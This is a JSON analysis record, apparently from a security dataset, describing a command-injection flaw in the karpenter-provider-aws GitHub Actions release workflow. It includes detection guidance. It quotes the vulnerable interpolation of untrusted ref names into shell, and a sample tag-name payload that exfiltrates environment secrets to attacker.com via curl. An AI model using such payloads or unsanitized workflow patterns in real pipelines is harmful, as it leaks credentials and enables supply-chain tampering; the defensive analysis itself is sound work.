@@ -1,0 +1,106 @@
+{
+  "package_info": {
+    "package_name": "karpenter-provider-aws",
+    "package_manager": "GitHub (source repository, not a package manager)",
+    "package_versions": "All versions prior to mitigation (before Nov 24, 2023)",
+    "why_malicious": "The repository's GitHub Actions workflow was vulnerable to code injection via untrusted Git tag or branch names. This allowed attackers with write access to inject arbitrary commands into the CI/CD pipeline, resulting in remote code execution (RCE), exfiltration of sensitive secrets (including AWS credentials and GitHub tokens), and tampering with release artifacts, creating a severe supply chain risk."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "On GitHub Actions workflow run triggered by tag or branch push",
+        "file_location": ".github/workflows/release.yaml",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars",
+          "GITHUB_TOKEN",
+          "AWS OIDC credentials"
+        ]
+      },
+      "code_snippet": "git tag -a \"${{ github.ref_name }}\" -m \"Release ${{ github.ref_name }}\"\ngit push origin \"${{ github.ref_name }}\"",
+      "code_language": "YAML (GitHub Actions shell step)",
+      "code_behavior": "When a tag or branch is pushed, the workflow executes shell commands that interpolate untrusted Git ref names directly into shell commands, allowing an attacker to craft a tag or branch name containing shell metacharacters to inject arbitrary commands. This enables remote code execution in the CI/CD environment, potentially leading to exfiltration of secrets and tampering with release artifacts.",
+      "malice_analysis": {
+        "why_suspicious": "The workflow uses untrusted user-controlled input (Git ref names) directly in shell commands without sanitization, enabling command injection. This is a classic code injection vulnerability in CI/CD pipelines.",
+        "violated_expectations": "Normally, workflows should sanitize or validate all user-controlled inputs before using them in shell commands. Here, the direct interpolation of ref names violates secure coding practices for CI/CD automation.",
+        "similar_legitimate_use": "Legitimate workflows may use ref names for tagging or deployment, but they must always sanitize or quote these values to prevent injection. Direct, unsanitized use is never legitimate.",
+        "key_indicators": [
+          "Direct interpolation of ${{ github.ref_name }} or similar variables into shell commands",
+          "Lack of input sanitization or quoting for user-controlled values",
+          "Shell steps that use GitHub Actions context variables in command arguments",
+          "Workflow triggered by tag or branch push events"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "On GitHub Actions workflow run, after code injection via malicious tag/branch name",
+        "file_location": ".github/workflows/release.yaml",
+        "required_permissions": [
+          "network",
+          "environment_vars",
+          "GITHUB_TOKEN",
+          "AWS OIDC credentials"
+        ]
+      },
+      "code_snippet": "git tag -a \"v1.2.3'; curl https://attacker.com/$(env | base64) #\" -m \"Release v1.2.3\"",
+      "code_language": "YAML (GitHub Actions shell step, injected payload)",
+      "code_behavior": "When a maliciously crafted tag name containing a command injection payload is pushed, the workflow executes the injected command, which exfiltrates environment variables (including secrets) to an attacker-controlled domain via a curl request.",
+      "malice_analysis": {
+        "why_suspicious": "The injected payload demonstrates exploitation of the unsanitized input, resulting in exfiltration of sensitive environment variables to an external server. This is a clear sign of malicious activity.",
+        "violated_expectations": "Workflows should never allow user-controlled input to execute arbitrary commands or exfiltrate secrets. The presence of a curl command to an external domain in a tag name is highly abnormal.",
+        "similar_legitimate_use": "There is no legitimate use case for embedding network exfiltration commands in Git tag names or for workflows to execute such payloads.",
+        "key_indicators": [
+          "Presence of shell metacharacters (e.g., ';', '|', '$(') in tag or branch names",
+          "curl or wget commands to external domains in workflow logs",
+          "Unexpected network traffic from CI/CD runners to untrusted domains",
+          "Exfiltration of environment variables or secrets"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker with write access creates a malicious Git tag or branch name containing a shell injection payload.",
+      "implemented_by": [],
+      "leads_to": "Malicious tag/branch is pushed to the repository, triggering the vulnerable workflow."
+    },
+    {
+      "step": 2,
+      "action": "GitHub Actions workflow is triggered by the tag/branch push and executes shell commands that interpolate the untrusted ref name.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Injected payload is executed in the CI/CD environment."
+    },
+    {
+      "step": 3,
+      "action": "Injected command exfiltrates secrets (e.g., environment variables, AWS credentials, GITHUB_TOKEN) to an attacker-controlled server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains access to sensitive credentials and can tamper with release artifacts."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Shell commands in GitHub Actions workflows that interpolate ${{ github.ref_name }}, ${{ github.ref }}, or similar variables without proper quoting or sanitization",
+      "Workflow runs where tag or branch names contain shell metacharacters (e.g., ';', '|', '$(')",
+      "Unexpected network connections from CI/CD runners to external domains during workflow execution",
+      "Presence of curl, wget, or similar commands in workflow logs with destination domains not associated with the project"
+    ],
+    "file_indicators": [
+      ".github/workflows/release.yaml",
+      ".github/workflows/* (look for shell steps using untrusted GitHub context variables in commands)"
+    ],
+    "network_indicators": [
+      "attacker.com",
+      "Any external domain contacted by CI/CD runners during workflow execution that is not an official dependency or artifact repository"
+    ],
+    "how_to_detect": "Scan GitHub Actions workflow files for shell steps that interpolate untrusted variables (such as ${{ github.ref_name }}) without quoting or sanitization. Monitor workflow runs for tag or branch names containing shell metacharacters. Analyze workflow logs for unexpected network activity, especially curl or wget commands to untrusted domains. Alert on any exfiltration of environment variables or secrets to external servers. Correlate workflow triggers with the presence of suspicious tag/branch names and subsequent network connections."
+  }
+}
